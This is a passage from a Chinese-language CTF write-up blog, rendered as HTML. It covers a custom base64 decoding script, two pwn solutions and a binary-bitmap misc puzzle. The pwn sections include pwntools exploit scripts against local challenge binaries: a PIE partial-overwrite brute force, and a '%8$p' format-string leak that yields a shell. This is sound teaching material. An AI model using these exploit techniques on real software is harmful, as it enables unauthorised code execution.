class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">S=” abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ”</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">My_base64_decode</span>(<span class="params">inputs</span>):</span></span><br><span class="line"></span><br><span class="line">    bin_str = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> inputs:</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> i != <span class="string">&#x27;=&#x27;</span>:</span><br><span class="line"></span><br><span class="line">           x = <span class="built_in">str</span>(<span class="built_in">bin</span>(s.index(i))).replace(<span class="string">&#x27;0b&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">           bin_str.append(<span class="string">&#x27;&#123;:0&gt;6&#125;&#x27;</span>.<span class="built_in">format</span>(x))</span><br><span class="line"></span><br><span class="line">    outputs = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    nums = inputs.count(<span class="string">&#x27;=&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> bin_str:</span><br><span class="line"></span><br><span class="line">       temp_list = bin_str[:<span class="number">4</span>]</span><br><span class="line"></span><br><span class="line">       temp_str = <span class="string">&quot;&quot;</span>.join(temp_list)</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span>(<span class="built_in">len</span>(temp_str) % <span class="number">8</span> != <span class="number">0</span>):</span><br><span class="line"></span><br><span class="line">           temp_str = temp_str[<span class="number">0</span>:-<span class="number">1</span> * nums * <span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">       <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">int</span>(<span class="built_in">len</span>(temp_str) / <span class="number">8</span>)):</span><br><span class="line"></span><br><span class="line">           outputs += <span class="built_in">chr</span>(<span class="built_in">int</span>(temp_str[i*<span class="number">8</span>:(i+<span class="number">1</span>)*<span class="number">8</span>],<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line">       bin_str = bin_str[<span class="number">4</span>:]   </span><br><span class="line"></span><br><span class="line">    print(<span class="string">&quot;Decrypted String:\n%s &quot;</span>%outputs)</span><br><span class="line"></span><br><span class="line">My_base64_decode(flag_enc)</span><br></pre></td></tr></table></figure><p>得到flag：Nep{Wwe_a4re_b1as3r!!Bby_Ccomptine}</p><p>下面几道直接地狱难度。。。。。。。。。。。。。。。。。。。。。</p><h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="1-签到-送你一朵小红花"><a href="#1-签到-送你一朵小红花" class="headerlink" title="1.[签到] 送你一朵小红花"></a>1.[签到] 送你一朵小红花</h3><p>64位程序，保护全开，先看一下main函数代码。</p><p>read向buf中读入数据，程序会执行buf[2]处所指向的代码。</p><p><img src="https://13-1301107080.cos.ap-guangzhou.myqcloud.com/clip_image002.jpg" alt="img"></p><p>可以看到这个函数中有拿到flag的代码，所以只要将buf[2]覆盖成puts5的地址就可以拿到flag。</p><p><img src="https://13-1301107080.cos.ap-guangzhou.myqcloud.com/image-20210322003842632.png" alt="image-20210322003842632"></p><p>因为程序开启了pie保护，地址不固定，但是地址的后三位是不变的。而buf[2]中本身存的也是一个data段的地址，所以只要覆盖两个字节进行爆破，有1/16的几率能拿到flag。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#4E1</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>+<span class="string">&#x27;\xe1\xa4&#x27;</span></span><br><span class="line">p.send(payload)</span><br><span class="line">flag = p.recvuntil(<span class="string">&#x27;&#125;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> flag</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">p.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="2-scmt"><a href="#2-scmt" class="headerlink" title="2.scmt"></a>2.scmt</h3><p>64位程序，只开启了nx保护，got表可写。</p><p><img src="https://13-1301107080.cos.ap-guangzhou.myqcloud.com/image-20210322003446283.png"></p><p>程序存在格式化字符串漏洞，只要让v14==v13就可以拿到shell。</p><p>利用格式化字符串漏洞泄露v14的值，再输入，就可以了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;name:\n&#x27;</span>,<span class="string">&#x27;%8$p&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;!!!&#x27;</span>)</span><br><span class="line"></span><br><span class="line">num = <span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;number:\n&#x27;</span>,<span class="built_in">str</span>(num))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="1-签到。"><a href="#1-签到。" class="headerlink" title="1.签到。"></a>1.签到。</h3><p>做了半天没出来。然后想到转二进制，然后发现有眉目了，但是难读，然后把1替换成空格，可读。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line">dd=<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111111111111111111111111111111111111111111111011111111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111111111111111111111111111111111111111111111011111111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111111111111111111111111111111111111111111111011111111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111111111111111111111111111111111111111111111001111111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111111111111111111111111111111111111111111110101111100000000000000011111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111111111111111111111111111111100000000000000100000001111111111111001111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111111111111111111111111111110001111111111111111111111111111111111110111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111111111111111111111111111100111111111111111111111111111111111111110011111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111111111111111111111111110011111111111111111111111111111111111111111011111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111111111111111111111111110111111111111111111111111111111111111111111011111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111111111111111111111111110111111111111111111111111111111111111111111011111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111101111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111101111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111101111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111100111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111100111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111111111111111111111111111111110000000000000000111111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111111111111111111111111111111100111111111111111000111111001111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111100001111111111111111111111111111111111111111111111101111111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111110001100111111111111111111111111111111111111111111111101111111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111100000011111110111111011111111111111111111111111111111111111111111011111111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111001111001111100111111001111111111111111111111111111111111111111111011111111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111011111101111001111111101111111111111111111111111111111111111111111011111111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111011111110111011111111100111111111111111111111111111111111111111111011111111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111011111110011011111111110111111111111111111111111111111111111111111001111111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111110011111111011011111111110111111111111111111111111111111111111111111100111111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111110111111111101011111111110011111111111111111111111111111111111111111110001111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111110111111111100011111111111011111111111111111111111111111111111111111111100000000000111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111110111111111100111111111111011111111111111111111111111111111111111111111000011111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111110111111111110111111111111011111111111111111111111111111111111111111100011111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111110111111111111111111111111101111111111111111111111111111111111111110011111111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111110111111111111111111111111101111111111111111111111111111111111111110111111111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111110111111111111111111111111101111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111110111111111111110011111111111111111111111111111111111111111111111111111111111110111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111110111111111111111111111111111111111111111111111111111111111111110011111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111101111111111111111111111111111111111111111111111111111100000111111011111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111101111111111111111111111111111111111111111111111111111001110111111001111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111101111111111111111111111111111111111111111111111111111011110111111101111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111101111111111111111111111111111111111111111111111111111011110111111101111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111110011111111111111111111111111111111111111111111111111011110111111001111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111001111111111111111111111111111111111111111111111111011110111111011111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111100011111111111111111111111111111111111111111111111011110111111011111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111000000000001111111111111111111111111111111111111111011110111110011111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111100011111100000111111111111111111111111111111111111111001110111110111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111001111111111111111111111111111111111111111111111111111100110111001111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111011111111111111111111111111111111111111111111111111111110000000011111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111111111111111111111111111111111111111111111111110111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111111111111111111111111111111111111111111111111110111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111100111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111110011111001111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111000111100011111111111111111111111111111111111111111000111111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111110110000001111111111111111111111111111111111111111111111001111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111100100011111111111111111111111111111111111111111111111111100001111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111101111000011111111111111111111111111111111111111111111111111100001111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111101111111100111111111111111111111111111111111111111111111111111000111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111101111111110001111111111111111111111111111111111111111111111100011111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111101111111111100111111111111111111111111111111111111111111110001111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111110111111111110111111111111111111111111111111111111111111000111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111001111111110111111111111111111111111111111111111111100111111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111100111111001111111111111111111111111111111111111100001111111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111000000011111111111111111111111111111111111111101111111111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="string">11111111111111111111111111111111111111111111111111111111111111111111111111111111111000111111111111111111111111111111111111111111</span></span><br><span class="line"><span 